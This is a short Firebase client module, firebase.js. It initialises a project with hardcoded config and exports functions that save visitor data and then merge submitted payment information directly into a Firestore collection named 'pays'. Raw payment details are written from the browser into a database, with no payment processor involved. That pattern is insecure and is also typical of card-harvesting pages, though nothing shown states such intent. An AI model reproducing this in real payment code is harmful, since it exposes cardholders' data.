// firebase.js
import { getApp, getApps, initializeApp } from "firebase/app";
import { getDatabase } from "firebase/database";
import { doc, getFirestore, setDoc } from "firebase/firestore";

const firebaseConfig = {
  apiKey: "AIzaSyCCVX4RZtVd1dEBhuapVYeu4slm3AflGlM",
  authDomain: "alwatnea-d.firebaseapp.com",
  databaseURL: "https://alwatnea-d-default-rtdb.firebaseio.com",
  projectId: "alwatnea-d",
  storageBucket: "alwatnea-d.firebasestorage.app",
  messagingSenderId: "693733003824",
  appId: "1:693733003824:web:60f0c2d39696c807e713f5",
  measurementId: "G-B5696GNRKM"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const database = getDatabase(app);

export async function addData(data: any) {
  localStorage.setItem("visitor", data.id);
  try {
    const docRef = await doc(db, "pays", data.id!);
    await setDoc(docRef, data, { merge: true });

    console.log("Document written with ID: ", docRef.id);
    // You might want to show a success message to the user here
  } catch (e) {
    console.error("Error adding document: ", e);
    // You might want to show an error message to the user here
  }
}
export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  try {
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      const docRef = doc(db, "pays", visitorId);
      await setDoc(
        docRef,
        { ...paymentInfo, createdDate: new Date().toISOString() },
        { merge: true }
      );
    }
  } catch (error) {
    console.error("Error adding document: ", error);
    alert("Error adding payment info to Firestore");
  }
};
export { db, database };
